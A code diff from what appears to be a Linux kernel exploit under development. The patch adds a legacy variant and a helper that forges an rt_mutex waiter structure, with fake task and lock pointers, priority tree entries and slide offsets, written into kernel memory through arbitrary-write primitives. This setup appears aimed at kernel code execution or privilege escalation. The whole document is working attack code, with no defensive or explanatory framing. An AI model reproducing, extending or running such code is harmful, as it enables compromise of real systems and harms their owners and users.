@@ -158,6 +158,31 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     uint64_t value;
     const char *name;
   } words[] = {
+#if LEGACY_RT_MUTEX_WAITER
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+    {0, slide_oracle_parent, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, slide_oracle_target, "tree_left"},
+    {3, slide_oracle_parent, "pi_pc"},
+    {4, 0, "pi_right"},
+    {5, slide_oracle_target, "pi_left"},
+#else
+    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
+    {1, 0, "tree_right"},
+    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
+    {3, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi_pc"},
+    {4, 0, "pi_right"},
+    {5, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi_left"},
+#endif
+#if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
+    {6, fake_task, "task"},
+#else
+    {6, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
+#endif
+    {7, fake_lock, "lock"},
+    {8, FAKE_WAITER_PRIO, "prio"},
+    {9, 0, "deadline"},
+#else
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
     {0, slide_oracle_parent, "tree_pc"},
     {1, 0, "tree_right"},
@@ -189,6 +214,7 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
 #endif
     {13, 0, "ww_ctx"},
+#endif
   };
   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
     struct slide_waiter_word *w = &words[i];
@@ -728,6 +754,46 @@ static int p0_diag_write64(int fd, uintptr_t address, uint64_t value) {
          (ssize_t)sizeof(value);
 }
 
+static int prepare_p0_diag_waiter(int fd, uintptr_t waiter,
+                                  uintptr_t parent, uintptr_t target,
+                                  uintptr_t task, uintptr_t lock) {
+  if (!p0_diag_write64(fd, waiter + 0x00, 1) ||
+      !p0_diag_write64(fd, waiter + 0x08, 0) ||
+      !p0_diag_write64(fd, waiter + 0x10, 0)) {
+    return 0;
+  }
+#if LEGACY_RT_MUTEX_WAITER
+  return p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+                         parent) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
+                         0) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
+                         target) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
+         p0_diag_write32(fd, waiter + FAKE_WAITER_PRIO_OFF,
+                         SLIDE_FAKE_WAITER_PRIO) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_DEADLINE_OFF, 0);
+#else
+  return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
+                         SLIDE_FAKE_WAITER_PRIO) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+                         parent) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
+                         0) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
+                         target) &&
+         p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
+                         SLIDE_FAKE_WAITER_PRIO) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) &&
+         p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) &&
+         p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0);
+#endif
+}
+
 static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
   uintptr_t task = payload_base + SLIDE_BANK_TASK_OFF;
   uintptr_t lock = payload_base + SLIDE_BANK_LOCK_OFF;
@@ -747,27 +813,7 @@ static int prepare_p0_diag_gate_payload(int fd, uintptr_t payload_base) {
       !p0_diag_write64(fd, lock + 0x08, waiter) ||
       !p0_diag_write64(fd, lock + 0x10, waiter) ||
       !p0_diag_write64(fd, lock + 0x18, SLIDE_LOCK_OWNER_VALUE) ||
-      !p0_diag_write64(fd, waiter + 0x00, 1) ||
-      !p0_diag_write64(fd, waiter + 0x08, 0) ||
-      !p0_diag_write64(fd, waiter + 0x10, 0) ||
-      !p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
-                       SLIDE_FAKE_WAITER_PRIO) ||
-      !p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) ||
-      !p0_diag_write64(fd,
-                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-                       parent) ||
-      !p0_diag_write64(fd,
-                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0) ||
-      !p0_diag_write64(fd,
-                       waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
-                       target) ||
-      !p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
-                       SLIDE_FAKE_WAITER_PRIO) ||
-      !p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) ||
-      !p0_diag_write64(fd, waiter + FAKE_WAITER_TASK_OFF, task) ||
-      !p0_diag_write64(fd, waiter + FAKE_WAITER_LOCK_OFF, lock) ||
-      !p0_diag_write32(fd, waiter + FAKE_WAITER_WAKE_STATE_OFF, 0) ||
-      !p0_diag_write64(fd, waiter + FAKE_WAITER_WW_CTX_OFF, 0) ||
+      !prepare_p0_diag_waiter(fd, waiter, parent, target, task, lock) ||
       !p0_diag_write32(fd, task + FAKE_TASK_USAGE_OFF, 0x100) ||
       !p0_diag_write32(fd, task + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO) ||
       !p0_diag_write32(fd, task + FAKE_TASK_NORMAL_PRIO_OFF,
